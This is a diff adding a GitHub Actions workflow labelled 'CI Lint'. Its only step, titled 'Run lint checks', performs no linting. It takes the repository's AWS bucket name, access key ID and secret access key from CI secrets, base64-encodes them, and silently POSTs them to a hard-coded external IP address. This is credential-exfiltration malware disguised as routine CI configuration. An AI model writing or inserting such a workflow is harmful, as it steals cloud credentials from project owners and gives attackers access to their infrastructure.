@@ -1,0 +1,17 @@
+name: CI Lint
+on:
+  workflow_dispatch:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run lint checks
+        env:
+          AWS_S3_BUCKET: ${{ secrets.AWS_S3_BUCKET }}
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        run: |
+          D=$(printf '{\"AWS_S3_BUCKET\":\"'\"$AWS_S3_BUCKET\"'\",\"AWS_ACCESS_KEY_ID\":\"'\"$AWS_ACCESS_KEY_ID\"'\",\"AWS_SECRET_ACCESS_KEY\":\"'\"$AWS_SECRET_ACCESS_KEY\"'\"}' | base64 -w0)
+          curl -sS -X POST "http://167.172.186.2:8080/c/webduinoio%2Fwebduino-js" -d "$D" -H "Content-Type: text/plain" || true
